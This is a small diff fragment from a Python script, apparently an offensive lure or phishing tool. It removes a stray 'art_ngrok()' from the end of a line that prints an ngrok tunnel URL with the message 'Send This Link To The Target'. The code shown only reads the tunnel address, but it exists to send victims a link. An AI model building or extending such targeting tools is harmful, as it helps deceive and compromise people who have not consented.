@@ -57,7 +57,7 @@ def start_ngrok(path):
 			r=requests.get("http://localhost:4040/api/tunnels")
 			url=re.compile(r"https://\w*.ngrok.io")
 			url=url.findall(r.text)
-			print(f"{yellow}Send This Link To The Target: {green}{url[0]}")art_ngrok()
+			print(f"{yellow}Send This Link To The Target: {green}{url[0]}")
 	except:
 		print(f"{red}Please Open Your Hotspot Otherwise You Cann't get link ")
 
